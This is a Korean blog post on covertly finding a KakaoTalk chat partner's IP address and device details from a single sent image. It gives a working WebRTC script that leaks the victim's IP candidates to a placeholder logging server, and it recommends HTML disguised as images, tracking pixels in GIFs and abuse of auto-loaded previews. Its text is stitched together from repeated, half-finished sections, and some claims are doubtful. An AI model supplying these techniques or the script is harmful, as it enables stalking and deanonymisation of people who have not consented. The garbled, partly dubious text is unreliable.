---
title: "사진 한 장으로 아이피 추적하기1 - 방법을 찾아보자"
categories: [security]
tags:
  - ects
date: 2025-04-01
---
# 📸 사진 한 장으로 아이피를 추적해보자!

우리는 평소에 별 생각 없이 카카오톡으로 이미지를 주고받는다. 그런데 이 **단 한 장의 이미지**가 상대방의 **공용 IP 주소**와 **접속 환경**을 추적하는 수단이 될 수 있다는 걸 아는가?

---

## 🧠 1. WebRTC를 활용한 IP 추적 원리

**WebRTC**는 브라우저 기반의 P2P 기술로, 영상통화나 파일 전송에 쓰인다. 이 기술은 브라우저 간 직접 통신을 만들기 때문에, 특정 조건이 맞으면 상대방의 공용 IP 주소(심지어 내부 IP까지도!)를 노출시킬 수 있다.

### **기본 절차**
1. 상대방이 WebRTC 추적 기능이 포함된 웹사이트에 접속하도록 유도
2. STUN 서버를 통해 상대방의 IP 정보를 수집
3. 수집한 IP를 기반으로 위치 추정

---

## 🖼️ 2. 이미지를 이용한 WebRTC 유도 방식

이미지만으로 WebRTC를 실행할 수는 없지만, **이미지를 가장한 HTML 페이지**나 **이미지에 연결된 링크**를 통해 상대방을 WebRTC 페이지로 유도할 수 있다.

### 📌 방법 A. 이미지에 링크를 숨겨두기
- EXIF 메타데이터에 링크 삽입 (단, 카카오톡은 이 정보를 삭제할 가능성이 높다)

### 📌 방법 B. HTML을 이미지처럼 위장
1. WebRTC 스크립트를 삽입한 HTML 파일을 만든다.
2. `<img>` 태그와 위장된 제목으로 상대방이 열도록 유도
3. 해당 HTML 파일이 열리면 WebRTC가 실행되고 IP 수집이 시작된다

```html
<script>
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pc.createDataChannel("");
    pc.createOffer().then(o => pc.setLocalDescription(o));
    pc.onicecandidate = e => {
        if (e.candidate) {
            fetch("https://yourserver.com/log", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ ip: e.candidate.candidate })
            });
        }
    };
</script>
```
>⚠️ 단점: 상대방이 '이미지'인 줄 알고 열어야 하며, 모바일에서는 실행되지 않을 수 있음

✅ 3. 우리는 이렇게 성공했다: 카카오톡 '사진 미리보기'를 이용한 실전 IP 추적 사례
WebRTC보다 더 현실적인 방식이 바로 이것이다.

카카오톡은 외부 이미지 링크를 미리보기로 자동 불러온다. 이 점을 활용하면, 상대방의 단말기에서 이미지를 로딩하면서 서버에 직접 요청이 들어오고, 그 순간 IP 주소, 브라우저 정보, 기종 정보가 로그로 남는다.
### **1. WebRTC를 활용한 IP 주소 추출 원리**

WebRTC는 브라우저 기반의 P2P(Peer-to-Peer) 기술로, 영상통화, 음성채팅, 파일 전송 등에 사용돼. WebRTC 기반의 서비스를 이용할 경우, 상대방의 **공용 IP 주소**(그리고 일부 경우 내부 IP) 를 확인할 수 있다.

**방법:**

1. 상대방이 WebRTC 기능이 포함된 웹사이트에 접속하도록 유도.
2. 사이트에서 STUN 서버를 이용해 상대방의 공용 IP를 가져옴.
3. 해당 IP를 기반으로 위치를 분석.

---

### **2. 이미지 파일을 통한 WebRTC 유도 방법**

이미지만 전송해서 직접 WebRTC를 실행할 수는 없지만, **이미지에 포함된 URL**을 통해 상대방을 WebRTC 트래킹 사이트로 유도하는 방법이 가능하다.
- 카카오톡 자체에서는 WebRTC가 자동 실행되지 않지만, **특정 방식으로 채팅방에서 코드가 실행되도록 유도할 수 있음.**

### **▶ 방법**

1. **GIF, 스티커, 동영상 파일에 WebRTC 기능이 포함된 링크를 삽입**.
2. **상대방이 클릭하지 않더라도, 미리보기 기능을 이용해 자동 실행되도록 제작**.

🚀 **실전 예제**:

- 상대방이 GIF 파일을 확인하는 순간, **외부 서버에서 WebRTC 실행 코드가 포함된 페이지가 로드**되도록 설정.
- GIF 또는 영상 파일 내부에 **추적용 픽셀(Tracking Pixel)**을 숨겨놓고, 상대방이 볼 때 자동 실행.

💡 **이 방식의 장점**:

- 상대방이 "클릭"하지 않아도 **채팅방에서 미리보기로 확인하는 순간** WebRTC 실행 가능.
- GIF나 영상은 자연스러워서 의심을 덜 살 가능성이 높음.

⚠️ **주의**: 카카오톡의 보안 업데이트에 따라 동작 방식이 달라질 수 있음.

### **방법 1: 이미지 내 링크 삽입 (Meta Link Trick)**

- 이미지 메타데이터(EXIF)에 특정 URL을 숨겨놓고, 상대방이 이미지를 열었을 때 해당 URL이 실행되도록 유도.
- 이 방식은 특정 프로그램에서만 동작하지만, **카카오톡에서는 작동하지 않을 가능성이 높음.**

### **방법 2: HTML 파일을 이미지처럼 위장 (더 효과적)**

1. **WebRTC 추적 페이지 제작**
    - WebRTC IP 추출 스크립트를 포함한 HTML 페이지를 만든다.
    - 이 HTML을 이미지처럼 위장하여 상대방이 열도록 유도.
2. **이미지를 링크로 연결**
    - 상대방이 이미지를 클릭하도록 만들고, 클릭 시 WebRTC 페이지가 열리게 함.
    - 카카오톡에서는 직접 실행되지 않을 수 있지만, 특정 브라우저에서 열리면 가능.
## **🔥 결론**

✅ **가장 확실한 방법**: **카카오톡 영상통화를 통해 WebRTC 패킷 분석**

✅ **차선책**: **WebRTC 기능이 포함된 문서파일(HTML, PDF 등)을 보내 실행 유도**

✅ **고급 기법**: **GIF, 영상 미리보기를 이용해 자동 실행 유도**